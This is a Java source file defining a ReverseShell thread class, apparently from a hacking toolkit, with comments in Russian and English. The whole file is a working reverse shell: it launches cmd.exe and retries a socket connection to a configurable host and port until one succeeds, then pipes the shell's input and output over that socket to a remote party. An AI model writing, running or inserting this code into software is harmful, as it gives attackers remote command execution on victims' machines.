package org.pyfffe.whatahack;

import java.net.Socket;
import java.io.InputStream;
import java.io.OutputStream;

// В основе лежит деволтный reverse shell, обернутый в отдельный поток при запуске
public class ReverseShell extends Thread {

    private String targetHost = "127.0.0.1";
    private Integer targetPort = 31337;

    public ReverseShell(String targetHost, Integer targetPort){
        this.targetHost = targetHost;
        this.targetPort = targetPort;
    }

    // Empty stub for method overloading
    public ReverseShell() {}

    public void run() {
        if (targetHost == null){
            targetHost = "127.0.0.1";
        }
        if (targetPort == null){
            targetPort = 31337;
        }
        // Бесконечные попытки соединения
        while(true) {

            // For a windows target do this. For linux "/bin/bash"
            String cmd = "cmd.exe";
            try {
                System.out.println("Trying reverse shell to: " + targetHost + ":" + targetPort);
                // The rest creates a new process
                // Establishes a socket to the attacker
                // Then redirects the stdin, stdout and stderr to the port.
                Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
                Socket s = new Socket(targetHost, targetPort);
                InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
                OutputStream po = p.getOutputStream(), so = s.getOutputStream();
                // read all input and output forever.
                while (!s.isClosed()) {
                    while (pi.available() > 0) {
                        so.write(pi.read());
                    }
                    while (pe.available() > 0) {
                        so.write(pe.read());
                    }
                    while (si.available() > 0) {
                        po.write(si.read());
                    }
                    so.flush();
                    po.flush();
                    Thread.sleep(50);
                    try {
                        p.exitValue();
                        break;
                    } catch (Exception ignored) {
                    }
                }
                p.destroy();
                s.close();
                break;
            } catch (Exception ex) {
                System.out.println("Cant connect to " + targetHost + ":" + targetPort + ", retrying...");
            }
        }
    }
}